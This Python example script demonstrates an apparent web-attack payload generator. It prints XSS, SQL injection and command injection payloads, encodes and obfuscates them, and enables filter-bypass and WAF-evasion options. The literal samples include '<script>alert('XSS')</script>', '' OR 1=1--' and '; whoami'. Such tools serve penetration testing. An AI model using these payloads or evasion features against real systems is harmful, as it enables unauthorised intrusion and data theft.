#!/usr/bin/env python3
"""
Basic usage example for the Custom Payload Generator
Demonstrates core functionality and basic payload generation
"""

import sys
import os

# Add src to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))

from core.payload_generator import PayloadGenerator
from core.encoders import PayloadEncoder
from core.obfuscators import PayloadObfuscator


def main():
    """Demonstrate basic usage of the payload generator"""
    
    print("=== Custom Payload Generator - Basic Usage Example ===\n")
    
    # Initialize the payload generator
    generator = PayloadGenerator()
    encoder = PayloadEncoder()
    obfuscator = PayloadObfuscator()
    
    print("1. Basic XSS Payload Generation")
    print("-" * 40)
    xss_payloads = generator.generate_xss_payloads(count=5, context='html')
    for i, payload in enumerate(xss_payloads, 1):
        print(f"{i}. {payload}")
    
    print("\n2. SQL Injection Payloads")
    print("-" * 40)
    sqli_payloads = generator.generate_sqli_payloads(count=5, database='mysql')
    for i, payload in enumerate(sqli_payloads, 1):
        print(f"{i}. {payload}")
    
    print("\n3. Command Injection Payloads")
    print("-" * 40)
    cmdi_payloads = generator.generate_cmdi_payloads(count=5, platform='both')
    for i, payload in enumerate(cmdi_payloads, 1):
        print(f"{i}. {payload}")
    
    print("\n4. Encoded Payloads")
    print("-" * 40)
    base_payload = "<script>alert('XSS')</script>"
    print(f"Original: {base_payload}")
    
    # Try different encodings
    encodings = ['base64', 'url', 'hex']
    for encoding in encodings:
        encoded = encoder.encode(base_payload, encoding)
        print(f"{encoding.upper()}: {encoded}")
    
    print("\n5. Obfuscated Payloads")
    print("-" * 40)
    xss_payload = "<script>alert('test')</script>"
    sqli_payload = "' OR 1=1--"
    cmdi_payload = "; id"
    
    print("Original XSS:", xss_payload)
    print("Obfuscated XSS:", obfuscator.obfuscate_xss(xss_payload))
    
    print("Original SQLi:", sqli_payload)
    print("Obfuscated SQLi:", obfuscator.obfuscate_sqli(sqli_payload))
    
    print("Original CMDi:", cmdi_payload)
    print("Obfuscated CMDi:", obfuscator.obfuscate_cmdi(cmdi_payload))
    
    print("\n6. Advanced Payload Generation")
    print("-" * 40)
    
    # Generate with multiple options enabled
    advanced_xss = generator.generate_xss_payloads(
        count=3,
        context='attribute',
        encoding='url',
        obfuscate=True,
        filter_bypass=True,
        waf_evasion=True
    )
    
    print("Advanced XSS payloads:")
    for i, payload in enumerate(advanced_xss, 1):
        print(f"{i}. {payload}")
    
    print("\n7. Payload Validation")
    print("-" * 40)
    
    test_payloads = [
        ("<script>alert('test')</script>", "xss"),
        ("' OR 1=1--", "sqli"),
        ("; whoami", "cmdi")
    ]
    
    for payload, payload_type in test_payloads:
        result = generator.validate_payload(payload, payload_type)
        print(f"Payload: {payload}")
        print(f"Type: {payload_type}")
        print(f"Valid: {result['valid']}")
        print(f"Score: {result['score']}")
        if result.get('warnings'):
            print(f"Warnings: {', '.join(result['warnings'])}")
        print()
    
    print("8. Payload Statistics")
    print("-" * 40)
    stats = generator.get_payload_stats()
    print(f"Total XSS payloads: {stats['xss_payloads']}")
    print(f"Total SQLi payloads: {stats['sqli_payloads']}")
    print(f"Total CMDi payloads: {stats['cmdi_payloads']}")
    print(f"Total payloads: {stats['total_payloads']}")
    print(f"Available encodings: {', '.join(stats['encoding_methods'])}")
    
    print("\n=== Example Complete ===")


if __name__ == '__main__':
    main()
